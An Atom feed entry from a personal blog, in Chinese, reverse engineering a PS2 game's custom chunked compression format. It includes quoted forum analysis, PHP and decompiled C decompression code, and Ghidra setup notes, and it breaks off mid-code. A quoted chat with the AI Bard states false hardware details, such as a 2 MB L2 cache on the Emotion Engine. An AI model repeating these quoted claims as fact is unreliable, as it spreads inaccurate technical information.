<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shadow Gallery</title>
  
  <subtitle>Live in the shadow</subtitle>
  <link href="https://srpopty.github.io/atom.xml" rel="self"/>
  
  <link href="https://srpopty.github.io/"/>
  <updated>2024-02-10T09:33:52.000Z</updated>
  <id>https://srpopty.github.io/</id>
  
  <author>
    <name>Srpopty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某上古 PS2 游戏逆向（四）文件格式分析与逆向</title>
    <link href="https://srpopty.github.io/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://srpopty.github.io/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2024-02-10T09:33:52.000Z</published>
    <updated>2024-02-10T09:33:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件结构分析"><a href="# 文件结构分析" class="headerlink" title="文件结构分析"></a>文件结构分析 </h1><p><a href="https://srpopty.github.io/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"> 前文 </a> 中通过简单地观察 <code>.HD</code> 和 <code>.BIN</code> 的对应关系以及大量的 <code>\xFF</code> 分隔符，实现了文件的初步提取，但是 <code>NORMAL</code>、<code>SCENE_ID</code>、<code>SCENEDAT</code>、<code>SYSTEM</code>、<code>VOICE_ID</code> 六个 <code>.BIN</code> 中，我们仅成功恢复了明文保存的 <code>SYSTEM</code> 以及 ADPCM 的 <code>VOICE_ID</code>，其余 4 个文件格式仍然未知。</p><p>我们首先从文件较小的 <code>NORMAL</code> 开始分析。多分析几个文件可以发现比较明显的特征：首先文件开头 4 个字节是一个 int 数字，根据分析 <code>.HD</code> 中的经验，推测可能是文件大小，但是这个数字总是比我们提取出的文件的文件大小要大。接着 4 个字节取值为 1、2、3、4、5、6、7、8、9、10，推测是一个标识位，之后一个字节是非 ASCII 字节。从第 10 个字节开始是文件的正文。</p><p>在第 9 个文件中发现了大量明文，看起来是一个结构类似 ini 的配置文件，而且根据内容判断是 <code>SYSTEM</code> 中每个 nut 文件的名字，但是其中仍然包含了不属于明文的字节。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/1.jpg" alt="Not Found"></p><p>同样在 <code>NORMAL</code> 的第 13 个文件中也发现了应该保存 <code>NORMAL</code> 中的文件名的文件，那么首先可以确定这两个文件一定是以明文保存的文件。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/2.jpg" alt="Not Found"></p><p>分析文件内容可以发现，大部分非 ASCII 字节连续序列以 <code>\xFF</code> 结尾，并且结合字节序列前后文本可以推测该文件被某种加密算法压缩，以及文件开头 4 个字节的 int 是文件压缩前大小。</p><p>将各种已知压缩算法均尝试了一遍以后，发现这是游戏作者自己实现的压缩技术。懒得逆程序，Google 了一下，发现有人也在逆向这个游戏，但是同样被这个 16 年前的压缩技术所困惑。<a href="https://www.vg-resource.com/thread-42169.html">帖子 </a> 里有两个老哥通过逆向游戏主程序，找到了解压缩函数，并且提取出了算法。</p><p>首先第一个老哥 <code>Raccoon Sam</code> 给出了自己的理解：</p><blockquote><p>Hey there!<br>Bad news – I really can’t wrap my head around it, I’m afraid :C</p><p>I’ve got samples for a compressed TIM2 file (“paktim” is just my nomenclature) extracted from the SCENEDAT and a legitimate, uncompressed counterpart TIM2 for it extracted from your save state. You can download them &gt; here.</p><p>The first eight bytes in the paktim are a header; 40 64 04 00 01 00 00 00 which should be read as two words, 00046440 00000001 which in turn just define the uncompressed size (0x46440 or 287808 bytes, which unsurprisingly is the file size of the legitimate TIM2 file) and the amount of files in the entry (1, which &gt; unsurprisingly is the … uh, amount of files)</p><p>After that, you read a byte as the variable instruction.<br>Logical AND instruction with 0x1F and add 2 to it to get the variable amount.<br>Shift instruction right five times to get the variable method.</p><p>According to the method and amount, read bytes from the bytestream:<br>Method 7 is just “read amount bytes and write them to output”.<br>Method 6 is “read 1 byte as surrogate and then repeat that byte exactly amount times to the output”.<br>Method 0 is “repeat FF exactly amount times to the output”.</p><p>The other methods are…. yeah, I dunno. Some methods look like they make sense but then the same method used later in the file does something completely different. I really can’t figure out what the trick here &gt; is. Really hope someone else takes a look at this, it’s driving me nuts!!</p></blockquote><p>文件开头 4 个字节的确是未压缩大小，之后 4 个字节帖子里的老哥认为是文件数量（不过这个并不是文件数量），之后读取 1 个字节作为 <code>instruction</code>，并进行 2 个运算得到 2 个变量：</p><ol><li><code>instruction &amp; 0x1f + 2</code> 可以得到 <code>amount</code> 变量。</li><li><code>instruction &gt;&gt; 5</code> 可以得到 <code>method</code> 变量。</li></ol><p>如果 <code>method</code> 是 7，则读取接下来 <code>amount</code> 个字节作为输出。</p><p>如果 <code>method</code> 是 6，则读取下一个字节并且重复 <code>amount</code> 次作为输出。</p><p>如果 <code>method</code> 是 0，则重复 <code>\xff</code> 字节 <code>amount</code> 次作为输出。</p><p>不过这哥们道行还是有点浅，并没有逆完整，所以这个并不是最终的解压算法，就在这哥们放弃以后，有一个老哥 <code>rufaswan</code> 觉得很有意思，并且接着逆出了“看似“完整的解压算法：</p><blockquote><p>I can see why this game trip you up. I don’t think I saw this kind of compression algorithm before. But I have a good understanding of it now.</p><p>Let’s use an example for a start, you want to duplicate 0xC9 for 0x40 times. First you use method 6 for 0x1f+2 bytes, so you’ll get “DF C9”. For the remaining 0x1f bytes, you repeat the last command, or method 0, but with length 0x1d+2 instead, so you’ll get “1D”.</p><p>Hence, the compressed data to duplicate 0xC9 for 0x40 times is “DF C9 1D”.</p><p>And the game keep the last 6 commands as history, or method 0 to 5.</p></blockquote><p>首先文件开始的 8 个字节就像上一个老哥逆的一样，是文件大小和文件数量（实际并不是文件数量），之后读取一个字节 <code>BYTE</code>，计算出 2 个变量：</p><ol><li><code>BYTE &amp; 0x1f</code> 可以得到 <code>LEN</code> 变量</li><li><code>BYTE &gt;&gt; 5</code> 可以得到 <code>METHOD</code> 变量</li></ol><p>如果 <code>METHOD</code> 是 7，则读取接下来 <code>LEN + 1</code> 个字节作为输出。</p><p>如果 <code>METHOD</code> 是 6，则读取下一个字节并且重复 <code>LEN + 2</code> 次作为输出。</p><p>在上述操作完成后，将其作为 <code>current</code> 放入 <code>HISTORY</code> 队列末尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HISTORY[<span class="number">5</span>] = HISTORY[<span class="number">4</span>]</span><br><span class="line">HISTORY[<span class="number">4</span>] = HISTORY[<span class="number">3</span>]</span><br><span class="line">HISTORY[<span class="number">3</span>] = HISTORY[<span class="number">2</span>]</span><br><span class="line">HISTORY[<span class="number">2</span>] = HISTORY[<span class="number">1</span>]</span><br><span class="line">HISTORY[<span class="number">1</span>] = HISTORY[<span class="number">0</span>]</span><br><span class="line">HISTORY[<span class="number">0</span>] = current</span><br></pre></td></tr></table></figure><p>如果 <code>METHOD</code> 在 <code>[0,5]</code> 之间，则作为 <code>current</code> 并且重新整理在<code>HISTORY</code> 中 <code>METHOD</code> 之前的所有元素，例如当 <code>METHOD</code> 是 3 时，则：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HISTORY[<span class="number">5</span>] <span class="comment">// do nothing</span></span><br><span class="line">HISTORY[<span class="number">4</span>] <span class="comment">// do nothing</span></span><br><span class="line">current = HISTORY[<span class="number">3</span>]</span><br><span class="line">HISTORY[<span class="number">3</span>] = HISTORY[<span class="number">2</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">2</span>] = HISTORY[<span class="number">1</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">1</span>] = HISTORY[<span class="number">0</span>] <span class="comment">// re-queue</span></span><br><span class="line">HISTORY[<span class="number">0</span>] = current <span class="comment">// re-queue</span></span><br></pre></td></tr></table></figure><p>如果连续的 <code>METHOD</code> 是 6，则重复下一个字节 <code>LEN + 2</code> 次作为输出。</p><p>如果连续的 <code>METHOD</code> 是 7，则从 <code>LEN</code> 中提取 2 个变量：</p><ol><li><code>LEN &amp; 3</code> 得到变量 <code>SUB_LEN</code></li><li><code>LEN &gt;&gt; 2</code> 得到变量 <code>SUB_POS</code></li></ol><p>之后从 <code>SUB_POS</code> 开始读取 <code>SUB_LEN + 1</code> 个字节作为输出。</p><p>最后这个老哥给了他对应的 PHP <a href="https://github.com/rufaswan/Web2D_Games/blob/master/tools/psxtools/ps2_zero_hd-bin.php">代码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_dict</span>(<span class="params"> &amp;<span class="variable">$dict</span>, <span class="variable">$lv</span>, &amp;<span class="variable">$e</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">5</span> )  <span class="variable">$dict</span>[<span class="number">5</span>] = <span class="variable">$dict</span>[<span class="number">4</span>]; <span class="comment">// -69c0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">4</span> )  <span class="variable">$dict</span>[<span class="number">4</span>] = <span class="variable">$dict</span>[<span class="number">3</span>]; <span class="comment">// -69c4</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">3</span> )  <span class="variable">$dict</span>[<span class="number">3</span>] = <span class="variable">$dict</span>[<span class="number">2</span>]; <span class="comment">// -69c8</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">2</span> )  <span class="variable">$dict</span>[<span class="number">2</span>] = <span class="variable">$dict</span>[<span class="number">1</span>]; <span class="comment">// -69cc</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lv</span> &gt;= <span class="number">1</span> )  <span class="variable">$dict</span>[<span class="number">1</span>] = <span class="variable">$dict</span>[<span class="number">0</span>]; <span class="comment">// -69d0</span></span><br><span class="line">    <span class="variable">$dict</span>[<span class="number">0</span>] = <span class="variable">$e</span>; <span class="comment">// -69d4</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zero_decode</span>(<span class="params"> &amp;<span class="variable">$file</span>, <span class="variable">$siz</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dec</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">trace</span>(<span class="string">&quot;== begin sub_116048\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dict</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">6</span>, ZERO),</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$st</span> = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$siz</span> &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$by</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$file</span>[<span class="variable">$st</span>] );</span><br><span class="line">            <span class="variable">$st</span>++;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$by</span> &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        <span class="variable">$len</span> = <span class="variable">$by</span> &amp; <span class="number">0x1f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$cmd</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">// c0</span></span><br><span class="line">                <span class="variable">$b</span> = <span class="variable">$file</span>[<span class="variable">$st</span>];</span><br><span class="line">                    <span class="variable">$st</span>++;</span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">array</span>(<span class="variable">$cmd</span>, <span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$e</span>);</span><br><span class="line">                <span class="variable">$dec</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$b</span>, <span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// e0</span></span><br><span class="line">                <span class="variable">$b</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="variable">$st</span>, <span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                    <span class="variable">$st</span> += (<span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="variable">$e</span> = <span class="keyword">array</span>(<span class="variable">$cmd</span>, <span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$e</span>);</span><br><span class="line">                <span class="variable">$dec</span> .= <span class="variable">$b</span>;</span><br><span class="line">                <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$ref</span> = <span class="variable">$dict</span>[<span class="variable">$cmd</span>];</span><br><span class="line">                <span class="title function_ invoke__">update_dict</span>(<span class="variable">$dict</span>, <span class="variable">$cmd</span>, <span class="variable">$ref</span>);</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$ref</span>[<span class="number">0</span>] )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">// c0</span></span><br><span class="line">                        <span class="variable">$dec</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$ref</span>[<span class="number">1</span>], <span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                        <span class="variable">$siz</span> -= (<span class="variable">$len</span> + <span class="number">2</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// e0</span></span><br><span class="line">                        <span class="variable">$dp</span> = <span class="variable">$len</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">                        <span class="variable">$dl</span> = <span class="variable">$len</span> &amp;  <span class="number">3</span>;</span><br><span class="line">                        <span class="variable">$b</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ref</span>[<span class="number">1</span>], <span class="variable">$dp</span>, <span class="variable">$dl</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$dec</span> .= <span class="variable">$b</span>;</span><br><span class="line">                        <span class="variable">$siz</span> -= (<span class="variable">$dl</span> + <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">goto</span> done;</span><br><span class="line">                &#125; <span class="comment">// switch ($ref[0] )</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// switch ($cmd)</span></span><br><span class="line">    &#125; <span class="comment">// while ($siz &gt; 0)</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="title function_ invoke__">trace</span>(<span class="string">&quot;== end sub_116048\n&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dec</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个老哥解释的比较抽象，实际上这是一个分块压缩算法，用一句话总结：解压缩时，对于每个 chunk 的第一个字节，低 5 位保存了长度，高 3 位保存了压缩方法，之后利用一个队列实现流式的 chunk 解压缩。</p><p>用这个老哥提供的代码写了个对应的 Python 版本进行解压缩，前文中提到 <code>NORMAL</code> 中第 9 个和第 13 个文件都成功解压缩，并且解压出了部分 TIM2 图片和 BMP 图片，其中 BMP 图片很明显是一个码表。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/3.bmp" alt="Not Found"></p><p>不过很可惜，这老哥逆的也不完整，按照这老哥的解压算法，仍然有部分文件解出来仍然是一个未知格式的文件，但是根据前面提到的 第 13 个文件包含了 <code>NORMAL</code> 中的文件名，在第 10～12 这三个文件中理论上应该保存的也是明文，但是解压出来的却是乱码。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/4.jpg" alt="Not Found"></p><p>例如第 10 个文件 <code>SCENE_ID.LST</code> 解压出的效果如下，很明显不可能是文件名列表。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/5.jpg" alt="Not Found"></p><p>通过 review 老哥的算法可以发现，从始至终都没有使用过文件开头的第 5～8 个字节，也就是前文中所谓的”文件数量“，这 4 个字节如果没有任何作用的话也就不会被塞在文件开头并且占用 4 个字节的空间，对于寸土寸金的 PS2，4 个字节也是挺奢侈的。</p><p>实际上通过观察解压缩失败与成功的文件，可以很容易得出结论：当第 5～8 个字节是 1 时，才会解压缩成功，否则解压缩出的就是乱码。至此我们推测，这个数字要么是表示压缩算法的种类，要么作为一个常量参与解压缩运算中，只不过当其取值为 1 时，这老哥的解压缩算法刚好正确。总之这老哥逆向逆一半，最后还得自己亲自逆，好在这老哥在代码中提供了解压缩函数的地址 <code>sub_116048</code>，自己动手，丰衣足食。</p><h1 id="MIPS 逆向准备"><a href="#MIPS 逆向准备" class="headerlink" title="MIPS 逆向准备"></a>MIPS 逆向准备 </h1><p><a href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"> 前文 </a> 中脚本语言分析完成后，还有存在很多没有定义的函数，那么剩下来的只有游戏主程序 <code>SLPS_258.97</code> 中可能存在这些函数的定义以及实现。好在 Ghidra 提供了 MIPS 反编译能力。虽然 PS2 的 CPU 5900l <code>Emotion Engine</code> 使用了 32 位的 MIPS-III，但是却是自定义的精简 MIPS 指令集，类似 microMIPS，在 MIPS16e 的基础上增删了一些指令。</p><hr><p><strong>Srpopty</strong>: Does the PlayStation2 use MIPS16e?</p><p><strong>Bard</strong>: No, the PlayStation 2 does not use MIPS16e. It uses a custom RISC processor called the Emotion Engine (EE). The EE is based on the MIPS III architecture, but it includes a number of extensions that are not found in MIPS16e. For example, the EE has a floating-point unit, which is not present in MIPS16e. The EE also has a number of instructions that are specifically designed for multimedia applications.</p><p>The PlayStation 2 was released in 2000, and at the time, MIPS16e was not a widely used architecture. MIPS16e was designed for embedded systems, and it was not considered to be powerful enough for high-end gaming consoles. The EE was a more powerful architecture that was better suited for the PlayStation 2’s target market.</p><p>Here are some additional details about the Emotion Engine:</p><p>The Emotion Engine is a 32-bit RISC processor.<br>The EE has a clock speed of 300 MHz.<br>The EE has a 2 MB L2 cache.<br>The EE has a floating-point unit.<br>The EE has a number of instructions that are specifically designed for multimedia applications.<br>The Emotion Engine was a powerful processor for its time, and it helped to make the PlayStation 2 one of the most successful gaming consoles of all time.</p><hr><p>因此直接用 Ghidra 内置的 MIPS 处理器无法完全识别所有指令，因此需要安装额外的 Ghidra 扩展 <a href="https://github.com/beardypig/ghidra-emotionengine">ghidra-emotionengine</a> 或者 <a href="https://github.com/chaoticgd/ghidra-emotionengine-reloaded">ghidra-emotionengine-reloaded</a>，根据 Ghidra 的版本安装不同的 Release，其中 ghidra-emotionengine 仅支持到 9.3，之后的 Ghidra 版本需要使用 ghidra-emotionengine-reloaded 提供的 Relase。</p><p>下载好的 Ghidra 扩展是一个 zip 压缩包，将解压后的文件夹移动到 <code>~/.ghidra/.ghidra_xx.xx_PUBLIC/Extensions/</code> 目录下，之后在 GUI 的 Project 界面的 File 下就可以加载扩展</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/25.jpg" alt="Not Found"></p><p>之后重启 Ghidra 后就可以用扩展提供的 r5900 处理器分析 <code>SLPS_258.97</code>，这时就可以正常解析指令。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/26.jpg" alt="Not Found"></p><h1 id="解压缩算法逆向"><a href="# 解压缩算法逆向" class="headerlink" title="解压缩算法逆向"></a>解压缩算法逆向 </h1><p> 逆向工作准备完成后，马不停蹄地来到前面老哥提供的解压缩函数 <code>0x116048</code> 处，结合 PCSX2 的 debuger 做了一些简单的分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decompress</span><span class="params">(byte *data,byte *dst,<span class="type">int</span> param_3,ulong size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> bVar1;</span><br><span class="line">  <span class="type">int</span> *piVar2;</span><br><span class="line">  <span class="type">int</span> *piVar3;</span><br><span class="line">  <span class="type">int</span> *piVar4;</span><br><span class="line">  <span class="type">int</span> *piVar5;</span><br><span class="line">  <span class="type">int</span> *piVar6;</span><br><span class="line">  ulong uVar7;</span><br><span class="line">  ulong uVar8;</span><br><span class="line">  byte *pbVar9;</span><br><span class="line">  byte *ref_0;</span><br><span class="line">  byte *end;</span><br><span class="line">  uint command;</span><br><span class="line">  ulong length;</span><br><span class="line">  ulong pos;</span><br><span class="line">  byte instruction;</span><br><span class="line">  </span><br><span class="line">  uVar8 = (ulong)(<span class="type">int</span>)dst;</span><br><span class="line">  end = dst + (<span class="type">int</span>)size;</span><br><span class="line">  uVar7 = (ulong)(<span class="type">int</span>)(end + <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  instruction = *data;</span><br><span class="line">  pos = uVar8;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    piVar3 = <span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">    piVar6 = <span class="built_in">queue</span>[<span class="number">3</span>];</span><br><span class="line">    piVar4 = <span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">                    <span class="comment">/* command == 6 */</span></span><br><span class="line">    pbVar9 = (byte *)pos;</span><br><span class="line">    <span class="keyword">if</span> ((instruction &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span>) &#123;</span><br><span class="line">      *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">      piVar5 = <span 